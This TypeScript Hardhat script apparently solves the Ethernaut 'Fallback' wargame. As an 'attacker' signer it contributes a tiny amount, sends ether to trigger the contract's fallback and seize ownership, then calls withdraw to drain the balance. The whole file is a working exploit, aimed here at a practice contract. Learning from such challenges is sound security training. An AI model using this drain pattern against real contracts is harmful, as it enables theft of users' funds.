import { Contract } from "ethers";
import { ethers } from "hardhat";
import { sendEther } from "../utils/sendEther";
import { abi } from "../artifacts/contracts/Fallback.sol/Fallback.json";
import { displayEthBalance } from "../utils/displayEthBalance";

async function deployContract() {
  const ContactFactory = await ethers.getContractFactory("Fallback");
  const contract = await ContactFactory.deploy();
  await contract.deployed();
  return contract;
}

function setFallbackContract() {
  const contractAddress = "0xFf01FA5D55e1C4eFf240b10817762bD99Acc6547";
  return new Contract(contractAddress, abi);
}

async function main() {
  const fallback = setFallbackContract();
  const [attacker] = await ethers.getSigners();

  let pendingTx = await fallback
    .connect(attacker)
    .contribute({ value: ethers.utils.parseEther("0.0001") });
  await pendingTx.wait();

  await sendEther(attacker, fallback.address, "0.001");
  await displayEthBalance("Before withdraw ", attacker, fallback.address);

  pendingTx = await fallback.connect(attacker).withdraw();
  await pendingTx.wait();
  await displayEthBalance("After withdraw ", attacker, fallback.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
